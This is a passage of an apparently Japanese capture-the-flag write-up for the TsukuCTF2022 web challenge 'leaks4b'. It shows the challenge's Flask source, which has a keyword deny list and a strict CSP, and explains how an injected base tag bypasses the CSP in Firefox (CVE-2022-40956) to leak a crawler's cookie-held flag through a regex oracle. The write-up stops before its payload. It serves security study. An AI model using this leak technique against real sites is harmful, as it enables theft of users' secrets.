<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><title>leaks4b-TsukuCTF2022</title><meta name="description" content="このサイトはSecHack365修了生よって運営されている非公式ののファンページです。"/><link rel="icon" href="/favicon.ico"/><meta name="og:title" content="leaks4b-TsukuCTF2022"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta property="og:image" content="https://opengraph.githubassets.com/139256f8ccf77c03f7d9d1b51e30822cb3d14d45abeae53f15384cefc9c7e9da/SecHack365-Fans/SecHack365-Fans.github.io"/><meta name="next-head-count" content="9"/><link rel="preload" href="/_next/static/css/d08ae8051f58b610.css" as="style"/><link rel="stylesheet" href="/_next/static/css/d08ae8051f58b610.css" data-n-g=""/><link rel="preload" href="/_next/static/css/9559f1eba3ad545f.css" as="style"/><link rel="stylesheet" href="/_next/static/css/9559f1eba3ad545f.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-49b6f2937c9ce9f4.js" defer=""></script><script src="/_next/static/chunks/framework-dc33c0b5493501f0.js" defer=""></script><script src="/_next/static/chunks/main-056d531d8af152ad.js" defer=""></script><script src="/_next/static/chunks/pages/_app-7e2d3fd7c9a12493.js" defer=""></script><script src="/_next/static/chunks/482-bd5197ea93394ef2.js" defer=""></script><script src="/_next/static/chunks/754-b8465c1d17288366.js" defer=""></script><script src="/_next/static/chunks/pages/ctf/TsukuCTF2022/%5Bid%5D-a940fa4d97f457fe.js" defer=""></script><script src="/_next/static/E8Mu5MlMTR0xFKIeOx1KX/_buildManifest.js" defer=""></script><script src="/_next/static/E8Mu5MlMTR0xFKIeOx1KX/_ssgManifest.js" defer=""></script><script src="/_next/static/E8Mu5MlMTR0xFKIeOx1KX/_middlewareManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><div><style data-emotion="css 1yjo05o">.css-1yjo05o{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}.css-1yjo05o>:not(style)+:not(style){margin:0;margin-left:8px;}</style><div class="Navigator_navbar__1D91M css-1yjo05o"><span class="Navigator_left__6lj_E"><style data-emotion="css 11qrfta">.css-11qrfta{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-11qrfta:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-11qrfta:hover{background-color:transparent;}}.css-11qrfta.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><style data-emotion="css 1ujsas3">.css-1ujsas3{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-1ujsas3::-moz-focus-inner{border-style:none;}.css-1ujsas3.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1ujsas3{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1ujsas3:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-1ujsas3:hover{background-color:transparent;}}.css-1ujsas3.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_home__FJLJi css-1ujsas3" tabindex="0" href="/">TOP</a><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA css-1ujsas3" tabindex="0" href="/blog">参加記</a><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA css-1ujsas3" tabindex="0" href="/timer">†締切駆動コース†</a><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA css-1ujsas3" tabindex="0" href="/ctf">TsukuCTF</a></span><span class="Navigator_right__OcvPs"><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA Navigator_right__OcvPs css-1ujsas3" tabindex="0" href="https://github.com/SecHack365-Fans/SecHack365-Fans.github.io"><style data-emotion="css vubbuv">.css-vubbuv{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:1.5rem;}</style><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="GitHubIcon"><path d="M12 1.27a11 11 0 00-3.48 21.46c.55.09.73-.28.73-.55v-1.84c-3.03.64-3.67-1.46-3.67-1.46-.55-1.29-1.28-1.65-1.28-1.65-.92-.65.1-.65.1-.65 1.1 0 1.73 1.1 1.73 1.1.92 1.65 2.57 1.2 3.21.92a2 2 0 01.64-1.47c-2.47-.27-5.04-1.19-5.04-5.5 0-1.1.46-2.1 1.2-2.84a3.76 3.76 0 010-2.93s.91-.28 3.11 1.1c1.8-.49 3.7-.49 5.5 0 2.1-1.38 3.02-1.1 3.02-1.1a3.76 3.76 0 010 2.93c.83.74 1.2 1.74 1.2 2.94 0 4.21-2.57 5.13-5.04 5.4.45.37.82.92.82 2.02v3.03c0 .27.1.64.73.55A11 11 0 0012 1.27"></path></svg></a></span></div><div style="padding:15px"><h1>leaks4b</h1>
<h2>問題文</h2>
<p>ケーキをあいまい検索できます。 どれを注文するか迷ってしまいます！！<br/>
<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">※フラグの形式はTsukuCTF22{[a-z]{7}}です。多数のリクエストを許容する問題ですが、数秒間隔をあけてください。配布されているソースは厳密なものではありません。フラグの提出回数は3回までとなっています。</code><br/>
<a href="http://133.130.96.134:31416/">http://133.130.96.134:31416</a></p>
<h2>難易度</h2>
<p><strong>hard</strong></p>
<h2>作問にあたって</h2>
<p>趣味 CTF ということもあり、キモイ問題を出しても良いでしょうということで 1day 問を出しました。<br/>
<!-- -->Mozilla に早めに報告してしまったので、0day 問ではなくなってしまいました(CVE-2022-40956)。<br/>
<!-- -->CSSi や ReDoS を用いたリークなど非想定解が思い浮かびまくり、修正しました。<br/>
<!-- -->もし、Firefox の 1day 以外で解かれた方がいましたら Writeup などで教えてくれると嬉しいです。<br/>
<!-- -->ちなみに Misc の soder はこの非想定解から生まれた問題です。<br/>
<!-- -->そして 4b は嘘です。</p>
<h2>解法</h2>
<p>URL とソースが渡される。<br/>
<!-- -->アクセスするとケーキを検索できるページのようだ。<br/>
<img src="https://raw.githubusercontent.com/SecHack365-Fans/SecHack365-Fans.github.io/master/pages/ctf/TsukuCTF2022/writeups/leaks4b/images/site1.png" alt="site1.png" style="width:80%"/><br/>
<!-- -->クローラが設置されており、パティシエが閲覧してくれるようだ。<br/>
<img src="https://raw.githubusercontent.com/SecHack365-Fans/SecHack365-Fans.github.io/master/pages/ctf/TsukuCTF2022/writeups/leaks4b/images/site2.png" alt="site2.png" style="width:80%"/><br/>
<!-- -->ひとまず配布されたソースの app.py を見ると、以下のようであった。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#67cdcc">~</span><span class="token token" style="color:#67cdcc">~</span><span class="token token" style="color:#67cdcc">~</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">def</span><span> </span><span class="token token" style="color:#f08d49">cssi_sanitizer</span><span class="token token" style="color:#ccc">(</span><span>text</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    </span><span class="token token" style="color:#999"># XSS could be mitigated by CSP, but CSSi and ReDoS are dangerous.</span><span>
</span><span>    deny_list </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;stylesheet&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;import&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;image&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;style&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;flag&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;link&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;img&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;\&quot;&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;$&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;&#x27;&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;(&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;)&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;*&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;+&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;:&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;;&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;?&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;@&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;[&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;\\&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;]&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;^&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;{&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;}&quot;</span><span class="token token" style="color:#ccc">]</span><span>
</span><span>    text </span><span class="token token" style="color:#67cdcc">=</span><span> text</span><span class="token token" style="color:#ccc">.</span><span>lower</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">any</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">[</span><span>hack </span><span class="token token" style="color:#cc99cd">in</span><span> text </span><span class="token token" style="color:#cc99cd">for</span><span> hack </span><span class="token token" style="color:#cc99cd">in</span><span> deny_list</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#7ec699">&quot;ハッキングケーキ&quot;</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">return</span><span> text
</span>
<span>menu </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;チョコレートケーキ, チョコケーキ, chocolatecake&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;チーズケーキ, cheesecake&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;バナナケーキ, bananacake&quot;</span><span class="token token" style="color:#ccc">]</span><span>
</span>
<span></span><span class="token token" style="color:#67cdcc">~</span><span class="token token" style="color:#67cdcc">~</span><span class="token token" style="color:#67cdcc">~</span><span>
</span><span></span><span class="token token decorator annotation" style="color:#ccc">@app</span><span class="token token decorator annotation" style="color:#ccc">.</span><span class="token token decorator annotation" style="color:#ccc">route</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;/&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">def</span><span> </span><span class="token token" style="color:#f08d49">top</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    cake </span><span class="token token" style="color:#67cdcc">=</span><span> request</span><span class="token token" style="color:#ccc">.</span><span>args</span><span class="token token" style="color:#ccc">.</span><span>get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;cake&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;チョコレートケーキ&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    cake </span><span class="token token" style="color:#67cdcc">=</span><span> cssi_sanitizer</span><span class="token token" style="color:#ccc">(</span><span>cake</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#ccc">:</span><span class="token token" style="color:#f08d49">100</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    flag </span><span class="token token" style="color:#67cdcc">=</span><span> request</span><span class="token token" style="color:#ccc">.</span><span>cookies</span><span class="token token" style="color:#ccc">.</span><span>get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;flag&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#999"># It is not expected to steal the cookie.</span><span>
</span><span>    </span><span class="token token" style="color:#999"># This is &quot;leaks4b.&quot;</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#ccc">(</span><span>flag </span><span class="token token" style="color:#67cdcc">==</span><span> FLAG</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">and</span><span> </span><span class="token token" style="color:#ccc">(</span><span>re</span><span class="token token" style="color:#ccc">.</span><span>findall</span><span class="token token" style="color:#ccc">(</span><span>cake</span><span class="token token" style="color:#ccc">,</span><span> FLAG</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        img </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;flag0.jpg&quot;</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">elif</span><span> re</span><span class="token token" style="color:#ccc">.</span><span>findall</span><span class="token token" style="color:#ccc">(</span><span>cake</span><span class="token token" style="color:#ccc">,</span><span> menu</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        img </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;cake0.jpg&quot;</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">elif</span><span> re</span><span class="token token" style="color:#ccc">.</span><span>findall</span><span class="token token" style="color:#ccc">(</span><span>cake</span><span class="token token" style="color:#ccc">,</span><span> menu</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        img </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;cake1.jpg&quot;</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">elif</span><span> re</span><span class="token token" style="color:#ccc">.</span><span>findall</span><span class="token token" style="color:#ccc">(</span><span>cake</span><span class="token token" style="color:#ccc">,</span><span> menu</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">2</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        img </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;cake2.jpg&quot;</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">else</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        img </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;cake3.jpg&quot;</span><span>
</span><span>    nonce </span><span class="token token" style="color:#67cdcc">=</span><span> secrets</span><span class="token token" style="color:#ccc">.</span><span>token_urlsafe</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">16</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;&quot;&quot;&lt;!doctype html&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">&lt;html&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">&lt;head&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">    &lt;meta charset=&quot;UTF-8&quot;&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">    &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;nonce-</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">nonce</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">&#x27;; base-uri &#x27;none&#x27;; connect-src &#x27;none&#x27;; font-src &#x27;none&#x27;; form-action &#x27;none&#x27;; frame-src &#x27;none&#x27;; object-src &#x27;none&#x27;; require-trusted-types-for &#x27;script&#x27;; worker-src &#x27;none&#x27;;&quot;&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">    &lt;script src=&quot;https://cdn.tailwindcss.com&quot; nonce=&quot;</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">nonce</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">&quot;&gt;&lt;/script&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">    &lt;title&gt;Leaks4b&lt;/title&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">&lt;/head&gt;
</span><span class="token token string-interpolation" style="color:#7ec699">~~~
</span><span class="token token string-interpolation" style="color:#7ec699">&quot;&quot;&quot;</span><span>
</span>
<span></span><span class="token token" style="color:#67cdcc">~</span><span class="token token" style="color:#67cdcc">~</span><span class="token token" style="color:#67cdcc">~</span><span>
</span><span></span><span class="token token decorator annotation" style="color:#ccc">@app</span><span class="token token decorator annotation" style="color:#ccc">.</span><span class="token token decorator annotation" style="color:#ccc">route</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;/order&quot;</span><span class="token token" style="color:#ccc">,</span><span> methods</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;POST&quot;</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">def</span><span> </span><span class="token token" style="color:#f08d49">order_post</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    url </span><span class="token token" style="color:#67cdcc">=</span><span> request</span><span class="token token" style="color:#ccc">.</span><span>form</span><span class="token token" style="color:#ccc">.</span><span>get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;url&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;____&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">not</span><span> url</span><span class="token token" style="color:#ccc">.</span><span>startswith</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;http&quot;</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#7ec699">&quot;[ERROR] http and https schemes are allowed.&quot;</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">try</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">with</span><span> sync_playwright</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> p</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            browser </span><span class="token token" style="color:#67cdcc">=</span><span> p</span><span class="token token" style="color:#ccc">.</span><span>firefox</span><span class="token token" style="color:#ccc">.</span><span>launch</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            context </span><span class="token token" style="color:#67cdcc">=</span><span> browser</span><span class="token token" style="color:#ccc">.</span><span>new_context</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            context</span><span class="token token" style="color:#ccc">.</span><span>add_cookies</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#7ec699">&quot;flag&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;value&quot;</span><span class="token token" style="color:#ccc">:</span><span> FLAG</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;httpOnly&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f08d49">True</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;url&quot;</span><span class="token token" style="color:#ccc">:</span><span> URL</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            page </span><span class="token token" style="color:#67cdcc">=</span><span> context</span><span class="token token" style="color:#ccc">.</span><span>new_page</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            page</span><span class="token token" style="color:#ccc">.</span><span>goto</span><span class="token token" style="color:#ccc">(</span><span>url</span><span class="token token" style="color:#ccc">,</span><span> timeout</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">10000</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            browser</span><span class="token token" style="color:#ccc">.</span><span>close</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">except</span><span> Exception </span><span class="token token" style="color:#cc99cd">as</span><span> e</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">print</span><span class="token token" style="color:#ccc">(</span><span>e</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">pass</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#7ec699">&quot;I received your cake order. Have the flag and wait for your cake!&quot;</span><span>
</span><span></span><span class="token token" style="color:#67cdcc">~</span><span class="token token" style="color:#67cdcc">~</span><span class="token token" style="color:#67cdcc">~</span></code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">?cake=</code>に入力した文字を正規表現としてケーキを検索している。<br/>
<!-- -->フラグも検索できるが、cookie がフラグ文字列と一致している場合にのみ検索可能なようで、クローラ以外には不可能と考えられる。<br/>
<!-- -->フラグが検索できた場合に表示される画像は<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">flag0.jpg</code>であり、ケーキは<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">cake0~3.jpg</code>である。<br/>
<!-- -->この画像にフラグが書かれているのではと予測し、アクセスするが以下の画像が表示されるだけであった。<br/>
<img src="https://raw.githubusercontent.com/SecHack365-Fans/SecHack365-Fans.github.io/master/pages/ctf/TsukuCTF2022/writeups/leaks4b/images/flag0.jpg" alt="flag0.jpg" style="width:80%"/><br/>
<!-- -->一見すると<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">?cake=</code>で任意の HTML タグを差し込め、XSS によってクローラの cookie を取得できそうだが httpOnly であるようだ。<br/>
<!-- -->さらに cssi_sanitizer と、とんでもなく厳しい CSP により守られており、XSS は愚か CSSi も難しい。<br/>
<!-- -->何とかしてクローラのフラグ検索結果の成否をリークしたい。<br/>
<!-- -->ここでユーザ由来の正規表現を使っているため、ReDoS の可能性もあることに気づく。<br/>
<!-- -->幸い CSP に img の制限はないため、自身のドメインを src に設定した img タグを挿入し、アクセスの有無を確認することで ReDoS の応答遅延によってフラグをリークする手法が思い浮かぶ。<br/>
<!-- -->しかし cssi_sanitizer や文字数制限が邪魔をして、これも難しい。<br/>
<!-- -->ここで試しによくある手法である base タグを挿入すると、CSP で none であるはずなのになぜか img の src を base の href へ問い合わせることがわかる。<br/>
<!-- -->これによって、CSP をバイパスして img の相対パスがリークできる。<br/>
<!-- -->img の画像ファイル名は検索結果によって異なるためクローラのフラグ検索結果のオラクルになりえる。<br/>
<!-- -->あとはフラグに一致する正規表現と base タグを cssi_sanitizer を躱してクエリに設定してやればよい。<br/>
<!-- -->フラグの<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">TsukuCTF22{</code>リークするクエリは以下になる。</p>
